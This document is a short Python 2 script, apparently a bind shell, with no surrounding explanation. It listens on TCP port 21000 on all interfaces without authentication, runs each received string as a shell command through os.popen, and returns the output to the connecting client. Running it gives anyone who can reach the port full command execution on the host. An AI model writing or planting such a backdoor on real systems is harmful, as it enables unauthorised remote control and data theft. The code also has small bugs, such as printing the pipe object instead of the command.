#!/usr/bin/env python


import socket,os
import time

host=''
port = 21000
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(2)
while 1:
	conn,addr=s.accept()
	print 'connected by:',addr

	while 1 :
		data=conn.recv(1024)
		data1=os.popen(data)
		data_recv = data1.read()
		print "get cmd:",data1
		conn.sendall(data_recv)
		time.sleep(2)
		if not data:
			break
conn.close()

